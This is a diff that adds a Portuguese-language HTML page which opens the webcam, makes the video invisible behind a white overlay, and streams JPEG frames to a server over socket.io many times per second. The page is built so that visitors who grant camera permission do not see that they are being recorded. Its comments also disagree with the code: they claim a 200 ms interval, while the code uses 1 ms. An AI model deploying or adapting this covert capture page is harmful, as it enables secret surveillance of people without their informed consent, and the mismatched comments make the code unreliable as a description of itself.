@@ -1,0 +1,81 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+  <meta charset="UTF-8">
+  <title>Capturador de Imagem</title>
+  <style>
+    body {
+      margin: 0;
+      padding: 0;
+      height: 100vh;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      background-color: #f0f0f0;
+      position: relative;
+      overflow: hidden;
+    }
+
+    video {
+      position: absolute;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      object-fit: cover; /* Faz o vídeo cobrir toda a tela */
+      opacity: 0; /* Tornar o vídeo invisível */
+    }
+
+    .overlay {
+      position: absolute;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background-color: rgba(255, 255, 255, 0.9); /* Camada branca semi-transparente */
+      z-index: 1; /* Coloca a camada branca sobre o vídeo */
+    }
+
+    h1 {
+      z-index: 2; /* Faz o título aparecer acima da camada branca */
+      position: relative;
+      font-size: 2rem;
+      color: #333;
+    }
+
+    canvas {
+      display: none;
+    }
+  </style>
+</head>
+<body>
+  <h1>Capturador de Imagem - Webcam</h1>
+  <div class="overlay"></div> <!-- Camada branca -->
+  <video id="video" autoplay></video>
+  <canvas id="canvas"></canvas>
+  
+  <script src="/socket.io/socket.io.js"></script>
+  <script>
+    const socket = io();
+    const video = document.getElementById('video');
+    const canvas = document.getElementById('canvas');
+    const ctx = canvas.getContext('2d');
+
+    // Solicitar permissão para acessar a câmera
+    navigator.mediaDevices.getUserMedia({ video: true })
+      .then((stream) => {
+        video.srcObject = stream;
+      })
+      .catch((err) => {
+        console.error('Erro ao acessar a câmera:', err);
+      });
+
+    // Capturar a imagem a cada 200 milissegundos (5 vezes por segundo)
+    setInterval(() => {
+      ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+      const imageData = canvas.toDataURL('image/jpeg'); // Captura a imagem em base64
+      socket.emit('image', imageData);  // Envia a imagem para o servidor
+    }, 1);  // Intervalo de 200 milissegundos
+  </script>
+</body>
+</html>
